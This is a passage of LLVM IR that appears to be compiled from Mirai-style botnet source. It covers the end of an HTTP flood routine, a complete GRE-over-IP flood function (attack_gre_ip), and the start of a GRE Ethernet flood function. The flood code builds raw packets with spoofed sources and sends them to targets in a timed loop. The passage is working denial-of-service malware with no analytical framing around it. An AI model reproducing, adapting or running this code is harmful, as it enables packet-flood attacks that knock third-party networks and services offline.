  %907 = add nsw i32 %906, -64
  store i32 %907, i32* %433, align 4
  br label %908

; <label>:908:                                    ; preds = %905, %902
  %909 = tail call i32* @__errno_location() #11
  store i32 0, i32* %909, align 4
  %910 = load i32, i32* %394, align 4
  %911 = load i32, i32* %433, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %912
  %914 = sub nsw i32 1024, %911
  %915 = sext i32 %914 to i64
  %916 = call i64 @recv(i32 %910, i8* %913, i64 %915, i32 16384) #10
  %917 = trunc i64 %916 to i32
  switch i32 %917, label %923 [
    i32 0, label %.thread581
    i32 -1, label %918
  ]

.thread581:                                       ; preds = %908
  store i32 104, i32* %909, align 4
  br label %920

; <label>:918:                                    ; preds = %908
  %.pr580 = load i32, i32* %909, align 4
  %919 = icmp eq i32 %.pr580, 11
  br i1 %919, label %.loopexit591, label %920

; <label>:920:                                    ; preds = %.thread581, %918
  %921 = load i32, i32* %394, align 4
  %922 = call i32 @close(i32 %921) #10
  store i32 -1, i32* %394, align 4
  store i8 0, i8* %431, align 4
  br label %.loopexit591

; <label>:923:                                    ; preds = %908
  %924 = load i32, i32* %433, align 4
  %925 = add nsw i32 %924, %917
  store i32 %925, i32* %433, align 4
  store i32 %392, i32* %437, align 4
  br label %926

; <label>:926:                                    ; preds = %1024, %923
  %927 = load i32, i32* %438, align 4
  %928 = icmp sgt i32 %927, 0
  br i1 %928, label %929, label %992

; <label>:929:                                    ; preds = %926
  %930 = load i32, i32* %433, align 4
  %931 = icmp sgt i32 %927, %930
  %.sink14 = select i1 %931, i32* %433, i32* %438
  %932 = load i32, i32* %.sink14, align 4
  %933 = sub nsw i32 %927, %932
  store i32 %933, i32* %438, align 4
  %934 = load i32, i32* %439, align 4
  %935 = icmp eq i32 %934, 1
  br i1 %935, label %936, label %992

; <label>:936:                                    ; preds = %929
  %937 = load i32, i32* %433, align 4
  %938 = call i8* @table_retrieve_val(i32 43, i32* null)
  %939 = call i32 @util_memsearch(i8* nonnull %436, i32 %937, i8* %938, i32 11)
  %940 = icmp eq i32 %939, -1
  br i1 %940, label %thread-pre-split573, label %941

; <label>:941:                                    ; preds = %936
  %942 = load i32, i32* %433, align 4
  %943 = call i8* @table_retrieve_val(i32 43, i32* null)
  %944 = call i32 @util_memsearch(i8* nonnull %436, i32 %942, i8* %943, i32 11)
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %945
  %947 = load i32, i32* %433, align 4
  %948 = sub nsw i32 %947, %944
  %949 = call i32 @util_memsearch(i8* %946, i32 %948, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %950 = add i32 %944, -1
  %951 = add i32 %950, %949
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %952
  store i8 0, i8* %953, align 1
  %954 = load i32, i32* %441, align 4
  %955 = icmp slt i32 %954, 5
  br i1 %955, label %956, label %991

; <label>:956:                                    ; preds = %941
  %957 = call i32 @util_strlen(i8* %946) #10
  %958 = icmp slt i32 %957, 128
  br i1 %958, label %959, label %991

; <label>:959:                                    ; preds = %956
  %960 = load i32, i32* %441, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %961, i64 0
  %963 = call i32 @util_strcpy(i8* %962, i8* %946) #10
  %964 = load i32, i32* %441, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %965, i64 0
  %967 = call i32 @util_strlen(i8* %966) #10
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %965, i64 %968
  %970 = call i32 @util_strcpy(i8* %969, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0)) #10
  %971 = add i32 %944, 3
  %972 = add i32 %971, %949
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %973
  %975 = load i32, i32* %433, align 4
  %976 = sub nsw i32 %975, %972
  %977 = call i32 @util_memsearch(i8* %974, i32 %976, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %978 = add i32 %972, -1
  %979 = add i32 %978, %977
  %980 = sext i32 %979 to i64
  %981 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %980
  store i8 0, i8* %981, align 1
  %982 = load i32, i32* %441, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %983, i64 0
  %985 = call i32 @util_strlen(i8* %984) #10
  %986 = sext i32 %985 to i64
  %987 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %983, i64 %986
  %988 = call i32 @util_strcpy(i8* %987, i8* %974) #10
  %989 = load i32, i32* %441, align 4
  %990 = add nsw i32 %989, 1
  store i32 %990, i32* %441, align 4
  br label %991

; <label>:991:                                    ; preds = %959, %956, %941
  store i32 -1, i32* %438, align 4
  store i8 10, i8* %431, align 4
  br label %.loopexit591

thread-pre-split573:                              ; preds = %936
  %.pr574 = load i32, i32* %438, align 4
  br label %992

; <label>:992:                                    ; preds = %thread-pre-split573, %929, %926
  %993 = phi i32 [ %.pr574, %thread-pre-split573 ], [ %933, %929 ], [ %927, %926 ]
  %.0522 = phi i32 [ %932, %thread-pre-split573 ], [ %932, %929 ], [ 0, %926 ]
  %994 = icmp eq i32 %993, 0
  br i1 %994, label %995, label %1022

; <label>:995:                                    ; preds = %992
  %996 = load i32, i32* %440, align 4
  %997 = icmp eq i32 %996, 1
  %998 = load i32, i32* %433, align 4
  br i1 %997, label %999, label %1017

; <label>:999:                                    ; preds = %995
  %1000 = call i32 @util_memsearch(i8* nonnull %436, i32 %998, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %1001 = icmp eq i32 %1000, -1
  br i1 %1001, label %1022, label %1002

; <label>:1002:                                   ; preds = %999
  %1003 = add nsw i32 %1000, -2
  %1004 = sext i32 %1003 to i64
  %1005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1004
  store i8 0, i8* %1005, align 1
  %1006 = call i32 @util_memsearch(i8* nonnull %436, i32 %1000, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %1007 = icmp eq i32 %1006, -1
  br i1 %1007, label %1011, label %1008

; <label>:1008:                                   ; preds = %1002
  %1009 = sext i32 %1006 to i64
  %1010 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1009
  store i8 0, i8* %1010, align 1
  br label %1011

; <label>:1011:                                   ; preds = %1002, %1008
  %1012 = call i32 @util_atoi(i8* nonnull %436, i32 16) #10
  %1013 = icmp eq i32 %1012, 0
  br i1 %1013, label %1014, label %1015

; <label>:1014:                                   ; preds = %1011
  store i8 1, i8* %431, align 4
  br label %.loopexit591

; <label>:1015:                                   ; preds = %1011
  %1016 = add nsw i32 %1012, 2
  store i32 %1016, i32* %438, align 4
  br label %1022

; <label>:1017:                                   ; preds = %995
  %1018 = sub nsw i32 %998, %.0522
  store i32 %1018, i32* %438, align 4
  %1019 = icmp eq i32 %1018, 0
  br i1 %1019, label %1020, label %1022

; <label>:1020:                                   ; preds = %1017
  store i8 1, i8* %431, align 4
  br label %.loopexit591

.backedge:                                        ; preds = %1022, %1024
  %.pr = load i8, i8* %431, align 4
  %1021 = icmp eq i8 %.pr, 7
  br i1 %1021, label %902, label %.loopexit591.loopexit

; <label>:1022:                                   ; preds = %999, %1015, %1017, %992
  %.1523 = phi i32 [ %1000, %1015 ], [ %.0522, %999 ], [ %.0522, %1017 ], [ %.0522, %992 ]
  %1023 = icmp eq i32 %.1523, 0
  br i1 %1023, label %.backedge, label %1024

; <label>:1024:                                   ; preds = %1022
  %1025 = load i32, i32* %433, align 4
  %1026 = sub nsw i32 %1025, %.1523
  store i32 %1026, i32* %433, align 4
  %1027 = sext i32 %.1523 to i64
  %1028 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1027
  %1029 = sext i32 %1026 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %436, i8* %1028, i64 %1029, i32 1, i1 false)
  %1030 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1029
  store i8 0, i8* %1030, align 1
  %1031 = load i32, i32* %433, align 4
  %1032 = icmp eq i32 %1031, 0
  br i1 %1032, label %.backedge, label %926

.preheader592:                                    ; preds = %.preheader592.preheader, %.preheader592
  %1033 = tail call i32* @__errno_location() #11
  store i32 0, i32* %1033, align 4
  %1034 = load i32, i32* %394, align 4
  %1035 = call i64 @recv(i32 %1034, i8* nonnull %21, i64 10240, i32 16384) #10
  %1036 = trunc i64 %1035 to i32
  switch i32 %1036, label %.preheader592 [
    i32 0, label %.thread584
    i32 -1, label %1037
  ]

.thread584:                                       ; preds = %.preheader592
  store i32 104, i32* %1033, align 4
  br label %.thread578

; <label>:1037:                                   ; preds = %.preheader592
  %.pr583 = load i32, i32* %1033, align 4
  %1038 = icmp eq i32 %.pr583, 11
  br i1 %1038, label %1041, label %.thread578

.thread578:                                       ; preds = %1037, %.thread584
  %1039 = load i32, i32* %394, align 4
  %1040 = call i32 @close(i32 %1039) #10
  store i32 -1, i32* %394, align 4
  store i8 0, i8* %431, align 4
  br label %.loopexit591

; <label>:1041:                                   ; preds = %1037
  %.pr577 = load i8, i8* %431, align 4
  %1042 = icmp eq i8 %.pr577, 0
  br i1 %1042, label %.loopexit591, label %1043

; <label>:1043:                                   ; preds = %1041
  store i8 1, i8* %431, align 4
  br label %.loopexit591

.loopexit591.loopexit:                            ; preds = %.backedge
  br label %.loopexit591

.loopexit591:                                     ; preds = %.loopexit591.loopexit, %1020, %1014, %991, %.thread578, %430, %918, %1041, %419, %920, %1043, %898, %450, %.lr.ph633, %885, %721, %447, %415
  %indvars.iv.next660 = add nuw nsw i64 %indvars.iv659, 1
  %1044 = icmp slt i64 %indvars.iv.next660, %70
  br i1 %1044, label %.lr.ph633, label %.backedge596.loopexit

; <label>:1045:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %26 = trunc i32 %25 to i8
  %27 = load i32, i32* @LOCAL_ADDR, align 4
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %27)
  %29 = tail call i64 @time(i64* null) #10
  %30 = zext i32 %0 to i64
  %31 = add i64 %29, %30
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %35 = bitcast i32* %6 to i8*
  %36 = call i32 @setsockopt(i32 %32, i32 0, i32 3, i8* nonnull %35, i32 4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %52, label %.preheader129

.preheader129:                                    ; preds = %34
  store i32 0, i32* %6, align 4
  %38 = zext i8 %1 to i32
  %39 = icmp eq i8 %1, 0
  br i1 %39, label %.preheader, label %.lr.ph131

.lr.ph131:                                        ; preds = %.preheader129
  %40 = sext i32 %22 to i64
  %41 = add nsw i64 %40, 52
  %42 = trunc i64 %41 to i16
  %43 = icmp ne i8 %17, 0
  %44 = add nsw i64 %40, 28
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %13, -1
  %47 = icmp eq i8 %26, 0
  %48 = add nsw i64 %40, 8
  %49 = trunc i64 %48 to i16
  %.promoted = load i32, i32* %6, align 4
  %50 = sext i32 %.promoted to i64
  %51 = zext i8 %1 to i64
  br label %70

; <label>:52:                                     ; preds = %34
  %53 = call i32 @close(i32 %32) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %114
  %54 = trunc i64 %indvars.iv.next to i32
  store i32 %54, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader129, %..preheader_crit_edge
  %55 = icmp eq i8 %1, 0
  %sext = shl i64 %31, 32
  %56 = ashr exact i64 %sext, 32
  %57 = icmp eq i32 %28, -1
  %58 = and i32 %12, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = and i32 %18, 65535
  %61 = icmp eq i32 %60, 65535
  %62 = and i32 %20, 65535
  %63 = icmp eq i32 %62, 65535
  %64 = icmp eq i8 %26, 0
  %65 = icmp eq i8 %24, 0
  %66 = sext i32 %22 to i64
  %67 = add i32 %22, 8
  %68 = add nsw i64 %66, 52
  %69 = sext i32 %22 to i64
  br label %126

; <label>:70:                                     ; preds = %.lr.ph131, %114
  %indvars.iv = phi i64 [ %50, %.lr.ph131 ], [ %indvars.iv.next, %114 ]
  %71 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %72 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %71, i8** %72, align 8
  %73 = getelementptr inbounds i8, i8* %71, i64 24
  %74 = getelementptr inbounds i8, i8* %71, i64 44
  store i8 69, i8* %71, align 4
  %75 = getelementptr inbounds i8, i8* %71, i64 1
  store i8 %11, i8* %75, align 1
  %76 = call zeroext i16 @htons(i16 zeroext %42) #11
  %77 = getelementptr inbounds i8, i8* %71, i64 2
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @htons(i16 zeroext %13) #11
  %80 = getelementptr inbounds i8, i8* %71, i64 4
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 4
  %82 = getelementptr inbounds i8, i8* %71, i64 8
  store i8 %15, i8* %82, align 4
  br i1 %43, label %83, label %87

; <label>:83:                                     ; preds = %70
  %84 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %85 = getelementptr inbounds i8, i8* %71, i64 6
  %86 = bitcast i8* %85 to i16*
  store i16 %84, i16* %86, align 2
  br label %87

; <label>:87:                                     ; preds = %83, %70
  %88 = getelementptr inbounds i8, i8* %71, i64 9
  store i8 47, i8* %88, align 1
  %89 = getelementptr inbounds i8, i8* %71, i64 12
  %90 = bitcast i8* %89 to i32*
  store i32 %28, i32* %90, align 4
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %92 = load i32, i32* %91, align 4
  %93 = getelementptr inbounds i8, i8* %71, i64 16
  %94 = bitcast i8* %93 to i32*
  store i32 %92, i32* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %96 = getelementptr inbounds i8, i8* %71, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  store i8 69, i8* %73, align 4
  %98 = getelementptr inbounds i8, i8* %71, i64 25
  store i8 %11, i8* %98, align 1
  %99 = call zeroext i16 @htons(i16 zeroext %45) #11
  %100 = getelementptr inbounds i8, i8* %71, i64 26
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %46) #11
  %103 = getelementptr inbounds i8, i8* %71, i64 28
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 4
  %105 = getelementptr inbounds i8, i8* %71, i64 32
  store i8 %15, i8* %105, align 4
  br i1 %43, label %106, label %110

; <label>:106:                                    ; preds = %87
  %107 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %108 = getelementptr inbounds i8, i8* %71, i64 30
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  br label %110

; <label>:110:                                    ; preds = %106, %87
  %111 = getelementptr inbounds i8, i8* %71, i64 33
  store i8 17, i8* %111, align 1
  br i1 %47, label %114, label %112

; <label>:112:                                    ; preds = %110
  %113 = load i32, i32* %94, align 4
  br label %114

; <label>:114:                                    ; preds = %110, %112
  %.sink = phi i32 [ %113, %112 ], [ 1023, %110 ]
  %115 = getelementptr inbounds i8, i8* %71, i64 40
  %116 = bitcast i8* %115 to i32*
  store i32 %.sink, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %19) #11
  %118 = bitcast i8* %74 to i16*
  store i16 %117, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %21) #11
  %120 = getelementptr inbounds i8, i8* %71, i64 46
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %49) #11
  %123 = getelementptr inbounds i8, i8* %71, i64 48
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %125 = icmp slt i64 %indvars.iv.next, %51
  br i1 %125, label %70, label %..preheader_crit_edge

; <label>:126:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %55, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %126
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %storemerge128130 = phi i32 [ %201, %171 ], [ 0, %.lr.ph.preheader ]
  %127 = sext i32 %storemerge128130 to i64
  %128 = getelementptr inbounds i8*, i8** %9, i64 %127
  %129 = load i8*, i8** %128, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 24
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %129, i64 44
  %133 = getelementptr inbounds i8, i8* %129, i64 52
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %127, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %127, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %129, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %57, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %129, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %59, label %149, label %154

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %129, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  %152 = getelementptr inbounds i8, i8* %129, i64 28
  %153 = bitcast i8* %152 to i16*
  store i16 999, i16* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %149, %148
  br i1 %61, label %155, label %157

; <label>:155:                                    ; preds = %154
  %156 = bitcast i8* %132 to i16*
  store i16 0, i16* %156, align 2
  br label %157

; <label>:157:                                    ; preds = %155, %154
  br i1 %63, label %158, label %161

; <label>:158:                                    ; preds = %157
  %159 = getelementptr inbounds i8, i8* %129, i64 46
  %160 = bitcast i8* %159 to i16*
  store i16 0, i16* %160, align 2
  br label %161

; <label>:161:                                    ; preds = %158, %157
  br i1 %64, label %166, label %162

; <label>:162:                                    ; preds = %161
  %163 = getelementptr inbounds i8, i8* %129, i64 16
  %164 = bitcast i8* %163 to i32*
  %165 = load i32, i32* %164, align 4
  br label %166

; <label>:166:                                    ; preds = %161, %162
  %.sink3 = phi i32 [ %165, %162 ], [ 0, %161 ]
  %167 = getelementptr inbounds i8, i8* %129, i64 40
  %168 = bitcast i8* %167 to i32*
  store i32 %.sink3, i32* %168, align 4
  br i1 %65, label %171, label %169

; <label>:169:                                    ; preds = %166
  call void @rand_alphastr(i8* nonnull %133, i32 %22)
  %170 = getelementptr inbounds i8, i8* %133, i64 %69
  store i8 0, i8* %170, align 1
  br label %171

; <label>:171:                                    ; preds = %166, %169
  %172 = getelementptr inbounds i8, i8* %129, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %129 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %129, i64 34
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = bitcast i8* %130 to i16*
  %179 = call zeroext i16 @checksum_generic(i16* %178, i32 20)
  store i16 %179, i16* %177, align 2
  %180 = getelementptr inbounds i8, i8* %129, i64 50
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  %182 = getelementptr inbounds i8, i8* %129, i64 48
  %183 = bitcast i8* %182 to i16*
  %184 = load i16, i16* %183, align 2
  %185 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %131, i8* nonnull %132, i16 zeroext %184, i32 %67)
  store i16 %185, i16* %181, align 2
  %186 = load i32, i32* %6, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %187, i32 0, i32 0
  store i16 2, i16* %188, align 4
  %189 = getelementptr inbounds i8, i8* %129, i64 16
  %190 = bitcast i8* %189 to i32*
  %191 = load i32, i32* %190, align 4
  %192 = load i32, i32* %6, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %193, i32 0, i32 2, i32 0
  store i32 %191, i32* %194, align 4
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %193, i32 0, i32 1
  store i16 0, i16* %195, align 2
  %196 = sext i32 %192 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %196, i32 0
  %198 = bitcast %struct.sockaddr_in* %197 to %struct.sockaddr*
  %199 = call i64 @sendto(i32 %32, i8* nonnull %129, i64 %68, i32 16384, %struct.sockaddr* %198, i32 16) #10
  %200 = load i32, i32* %6, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %6, align 4
  %202 = icmp slt i32 %201, %38
  br i1 %202, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %171
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %126
  %203 = call i64 @time(i64* null) #10
  %204 = icmp sgt i64 %203, %56
  br i1 %204, label %.loopexit.loopexit, label %126

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %52
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %10 = zext i8 %1 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %12 = bitcast i8* %11 to i8**
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %16 = trunc i32 %15 to i16
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %27 = trunc i32 %26 to i8
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = load i32, i32* @LOCAL_ADDR, align 4
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %30)
  %32 = tail call i64 @time(i64* null) #10
  %33 = zext i32 %0 to i64
  %34 = add i64 %32, %33
  %35 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %38 = bitcast i32* %6 to i8*
  %39 = call i32 @setsockopt(i32 %35, i32 0, i32 3, i8* nonnull %38, i32 4) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %55, label %.preheader136

.preheader136:                                    ; preds = %37
  store i32 0, i32* %6, align 4
  %41 = zext i8 %1 to i32
  %42 = icmp eq i8 %1, 0
  br i1 %42, label %.preheader, label %.lr.ph138

.lr.ph138:                                        ; preds = %.preheader136
  %43 = sext i32 %25 to i64
  %44 = add nsw i64 %43, 66
  %45 = trunc i64 %44 to i16
  %46 = icmp ne i8 %20, 0
  %47 = add nsw i64 %43, 28
  %48 = trunc i64 %47 to i16
